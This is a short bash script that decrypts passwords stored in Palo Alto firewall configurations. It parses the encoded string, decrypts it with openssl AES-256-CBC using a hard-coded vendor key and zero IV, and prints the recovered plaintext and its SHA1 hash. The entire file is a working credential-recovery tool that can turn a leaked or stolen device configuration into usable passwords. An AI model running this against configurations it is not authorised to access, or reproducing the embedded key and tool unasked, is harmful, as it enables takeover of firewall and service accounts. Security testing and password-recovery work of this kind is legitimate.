#!/bin/bash
# Decrypt Palo-Alto passwords
# By Eldar Marcussen

input="$1"

# Remove the leading dash
cleaned="${input#-}"

# Extract prefix (everything up to the first non-= character after AQ==)
prefix="AQ=="

# Remove prefix to get the remainder
remainder="${cleaned#AQ==}"

# Split on the = that ends the hash (look for = followed by non-= character)
# The hash ends at the = before the encrypted part starts
if [[ $remainder =~ ^([^=]*=)(.*)$ ]]; then
    hash="${BASH_REMATCH[1]}"
    encrypted="${BASH_REMATCH[2]}"
else
    echo "Error: String doesn't match expected pattern"
    exit 1
fi
shash=$(echo -n "$hash" | base64 -d - | xxd -ps)
ptest=$(echo -n "$encrypted" | openssl aes-256-cbc -d -K 8103850245b9b48f0428c5b74e2615528103850245b9b48f0428c5b74e261552 -iv 0 -base64 -d -A 2>/dev/null)
phash=$(echo -n "$ptest" | sha1sum -)

echo "prefix: $prefix"
echo "encrypted: $encrypted"
echo "hash: $hash ($shash)" 
echo "plain: $ptest ($phash)"
